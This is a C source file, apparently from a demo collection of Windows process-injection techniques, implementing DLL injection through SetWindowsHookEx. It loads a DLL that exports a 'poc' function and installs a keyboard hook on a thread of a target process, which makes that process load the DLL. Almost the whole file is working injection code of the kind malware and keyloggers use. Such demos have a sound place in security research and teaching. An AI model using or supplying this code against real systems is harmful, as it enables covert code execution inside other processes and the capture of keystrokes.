#include <stdio.h>
#include <Windows.h>
#include <tlhelp32.h>
#include "fheaders.h"
#include "auxiliary.h"

DWORD demoSetWindowsHookEx(PCWSTR pszLibFile, DWORD dwProcessId, wchar_t *strProcName)
{
	DWORD dwThreadId = getThreadID(dwProcessId);
	if (dwThreadId == (DWORD)0)
	{
		wprintf(TEXT("[-] Error: Cannot find thread"));
		return(1);
	}

#ifdef _DEBUG
	wprintf(TEXT("[+] Using Thread ID %u\n"), dwThreadId);
#endif

	HMODULE dll = LoadLibraryEx(pszLibFile, NULL, DONT_RESOLVE_DLL_REFERENCES);
	if (dll == NULL) 
	{
		wprintf(TEXT("[-] Error: The DLL could not be found.\n"));
		return(1);
	}

	// Your DLL needs to export the 'poc' function
	HOOKPROC addr = (HOOKPROC)GetProcAddress(dll, "poc");
	if (addr == NULL) 
	{
		wprintf(TEXT("[-] Error: The DLL exported function was not found.\n"));
		return(1);
	}

	HWND targetWnd = FindWindow(NULL, strProcName);
	GetWindowThreadProcessId(targetWnd, &dwProcessId);

	HHOOK handle = SetWindowsHookEx(WH_KEYBOARD, addr, dll, dwThreadId);
	if (handle == NULL)
	{
		wprintf(TEXT("[-] Error: The KEYBOARD could not be hooked.\n"));
		return(1);
	}
	else
	{
		wprintf(TEXT("[+] Program successfully hooked.\nPress enter to unhook the function and stop the program.\n"));
		getchar();
		UnhookWindowsHookEx(handle);
	}

	return(0);
}